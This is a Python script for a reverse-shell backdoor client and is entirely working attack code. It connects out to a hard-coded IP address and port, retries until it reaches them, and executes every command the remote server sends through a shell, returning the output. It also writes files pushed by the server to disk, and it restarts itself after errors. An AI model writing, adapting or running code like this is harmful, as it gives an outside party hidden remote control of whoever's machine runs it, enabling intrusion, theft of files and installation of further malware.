import os
import socket
import subprocess
import time

#create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host ="192.168.2.111"
        port = 9999
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error:" +str(msg))

# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host,port))
    except socket.error as msg:
        print("Socket connection error: "+ str(msg))
        time.sleep(5)
        socket_connect()

#Receive commands from remote server and run on local machine
def receive_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode('utf-8'))
            except:
                pass

        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        if len(data) > 0:
            if data.decode('utf-8') == "upload":
                print('OK')
                try:
                    s.send(bytes('upload ready', 'utf-8'))
                    recv_info = s.recv(20480).decode('utf-8').split(" ")
                    print(recv_info)
                    path, file_size = recv_info[2], int(recv_info[3])
                    if os.path.isdir(path):
                        file_name = recv_info[1].split("/")[-1]
                        write_file_path = r'/'.join([path, file_name])
                    elif not os.path.isfile(path):
                        temp_path = path.split('/')
                        new_path = '/'.join([temp_path[0:-1]])
                        if os.path.isdir(new_path):
                            file_name = path.split("/")[-1]
                            write_file_path = r'/'.join([new_path, file_name])
                        else:
                            print('path is not exists')
                    else:
                        print("you got error, maybe filename was exists")
                    already_recv = 0
                    with open(write_file_path, 'ab') as f:
                        while already_recv != file_size:
                            file_data = s.recv(1024)
                            f.write(file_data)
                            already_recv += len(file_data)
                except:
                    pass
            else:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "BIG5")   #You can change your language encode
                    s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                    print(output_str)
                except:
                    output_str = "Command not recognized" +'\n'
                    s.send(str.encode(output_str+str(os.getcwd())+ '> '))
                    print(output_str)
    s.close()

def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()

if __name__ == "__main__":
    main()


